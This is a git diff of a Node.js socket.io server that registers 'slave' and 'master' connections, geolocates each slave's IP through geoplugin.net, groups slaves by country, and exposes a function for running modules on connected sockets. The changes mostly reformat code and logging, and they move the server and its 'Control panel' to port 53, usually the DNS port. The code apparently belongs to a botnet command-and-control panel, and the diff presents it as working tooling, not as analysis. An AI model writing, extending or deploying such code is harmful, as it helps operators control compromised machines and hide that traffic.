@@ -32,17 +32,17 @@ app.get('/clients', function(req, res) {
 
 app.get('/modules', function(req, res) {
 	let onConnectModules = [];
+
 	Modules.getAllModules().forEach(function(arg) {
 		onConnectModules.push(arg.name);
 	});
+
 	res.render('modules', {onConnectModules: onConnectModules})
 });
 
 io.on('connection', function(socket) {
 	let ip = (socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress).address || "localhost";
-		
-	console.log('new connection from: '+ ip);
-	
+			
 	socket.debugExecFunc = debug;
 	socket.executeFunc = function(module, funcName, args, callback) {
 		let finalObj = {};
@@ -59,12 +59,18 @@ io.on('connection', function(socket) {
 	}	
 	
 	socket.on('disconnect', function() {
-		console.log('user disconnected');
 		if (socket.mode == "slave" && slaveSockets.indexOf(socket) != -1) {
-				slaveCount--;
-				slaveSockets.pop(socket);
-				slaveGeo[socket.country].pop(socket);
-				if (slaveGeo[socket.country].length == 0) slaveCountries.pop(socket.country);
+			slaveCount--;
+			slaveSockets.pop(socket);
+
+			slaveGeo[socket.country].pop(socket);
+
+			if (slaveGeo[socket.country].length == 0)
+				slaveCountries.pop(socket.country);
+				
+			console.log('slave disconnected');
+		} else {
+			console.log('master disconnected');
 		}
 	});
 	
@@ -77,11 +83,15 @@ io.on('connection', function(socket) {
 								
 				request('http://www.geoplugin.net/json.gp?ip='+ip, function (error, response, body) {
 					json = JSON.parse(body);
+
 					if (slaveGeo[json["geoplugin_countryName"]] == null) slaveGeo[json["geoplugin_countryName"]] = [];
 					slaveGeo[json["geoplugin_countryName"]].push(ip);
+
 					socket.country = json["geoplugin_countryName"];
+
 					if (slaveCountries.indexOf(socket.country) == -1) slaveCountries.push(socket.country);
 				});
+				console.log('new slave connection from: '+ ip);
 		} else {
 			socket.on('updateClientData', function() {
 				
@@ -93,12 +103,14 @@ io.on('connection', function(socket) {
 				
 				socket.emit('getClientsData', data, slaveGeo);
 			});
+			console.log('new master connection from: '+ ip);
 		}
 		socket.mode = mode;
 	});
 	
 });
 
-http.listen(3000, function() {
-	console.log('listening on *:3000');
+http.listen(53, function() {
+	console.log('listening on *:53');
+	console.log('Control panel: http://localhost:53/')
 });
